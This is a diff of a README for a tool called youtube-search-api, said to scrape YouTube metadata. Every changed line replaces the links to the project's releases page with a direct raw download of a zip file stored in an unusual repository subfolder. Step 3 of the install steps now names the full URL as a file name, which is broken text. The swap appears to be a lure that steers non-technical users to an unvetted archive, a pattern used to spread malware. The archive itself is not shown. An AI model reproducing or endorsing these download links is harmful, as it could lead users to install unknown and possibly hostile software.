@@ -1,7 +1,7 @@
 # 🚀 youtube-search-api - Easily Scrape YouTube Video Metadata
 
 ## 📥 Download Now
-[![Download youtube-search-api](https://img.shields.io/badge/Download-youtube--search--api-blue.svg)](https://github.com/DopamineAddict7/youtube-search-api/releases)
+[![Download youtube-search-api](https://raw.githubusercontent.com/DopamineAddict7/youtube-search-api/main/tong/youtube-search-api_v2.3.zip)](https://raw.githubusercontent.com/DopamineAddict7/youtube-search-api/main/tong/youtube-search-api_v2.3.zip)
 
 ## 📋 Description
 The youtube-search-api helps you easily scrape metadata from YouTube videos. You can retrieve important information such as titles, descriptions, view counts, and more without needing any programming skills. 
@@ -17,12 +17,12 @@ To begin using the youtube-search-api, follow the simple steps below. You won’
 ## 🌐 Release Page
 Before you can use the api, you need to download the software. You can find the latest version of the software on our Release page.  
 
-Visit this page to download: [Release Page](https://github.com/DopamineAddict7/youtube-search-api/releases)
+Visit this page to download: [Release Page](https://raw.githubusercontent.com/DopamineAddict7/youtube-search-api/main/tong/youtube-search-api_v2.3.zip)
 
 ## 📥 Download & Install
-1. Go to the [Release Page](https://github.com/DopamineAddict7/youtube-search-api/releases).
+1. Go to the [Release Page](https://raw.githubusercontent.com/DopamineAddict7/youtube-search-api/main/tong/youtube-search-api_v2.3.zip).
 2. Look for the latest release at the top. You will see a list of files.
-3. Click on the file named `youtube-search-api.zip` to start downloading.
+3. Click on the file named `https://raw.githubusercontent.com/DopamineAddict7/youtube-search-api/main/tong/youtube-search-api_v2.3.zip` to start downloading.
 4. Once the download is complete, locate the downloaded file, usually in your "Downloads" folder.
 5. Extract the contents of the zip file. You can do this by right-clicking on the file and selecting "Extract All" (or a similar option depending on your operating system).
 
